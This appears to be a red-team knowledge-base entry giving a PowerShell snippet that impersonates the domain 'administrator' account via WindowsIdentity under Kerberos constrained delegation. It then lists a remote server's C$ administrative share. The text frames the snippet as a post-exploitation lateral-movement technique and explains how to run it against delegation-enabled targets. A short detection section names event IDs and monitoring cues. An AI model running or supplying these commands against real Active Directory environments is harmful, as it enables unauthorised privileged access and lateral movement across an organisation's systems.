---
type: code
language: powershell
verified: true
tags:
  - impersonation
  - kerberos-delegation
  - active-directory
platforms:
  - Windows
validated: true
---

# PowerShell-WindowsIdentity-Impersonation-for-Resource-Access

## Code

```powershell
PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS> $idToImpersonate.Impersonate()
PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS> ls \\$SERVER\c$
```

## Description

This PowerShell code snippet demonstrates impersonating a domain user (e.g., 'administrator') using WindowsIdentity to access a remote resource via Kerberos Constrained Delegation. It loads the required assembly, creates an impersonation context, switches to the target identity, verifies the change, and lists contents of a remote administrative share. This is useful in post-exploitation scenarios for lateral movement in Active Directory environments where the attacker's account has delegation privileges.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $USERNAME | The domain username to impersonate (hardcoded as 'administrator' in the code) | administrator |
| $SERVER | The target server name or IP for the remote resource (e.g., C$ share) | dc01.offense.local |

## Usage

Execute this in a PowerShell session on a domain-joined machine with delegation-enabled credentials. Substitute the username and server variables before running. Use in conjunction with procedures like Kerberos-Constrained-Delegation-Impersonation-on-Resource to test or exploit delegation misconfigurations. Start with a listener or logger to capture output, and ensure the target resource is configured for delegation (e.g., via msDS-AllowedToDelegateTo).

## Detection

- Monitor PowerShell execution logs for assembly loads (System.IdentityModel) and impersonation calls (Event ID 4624 with logon type 9 for new credentials).
- Audit Kerberos S4U2Proxy requests (Event ID 4769) for unusual principal names.
- Network logs showing access to administrative shares from unexpected sources.
- Process monitoring for PowerShell spawning with identity switches.

## Related

- [[procedures/Kerberos-Constrained-Delegation-Impersonation-on-Resource]]
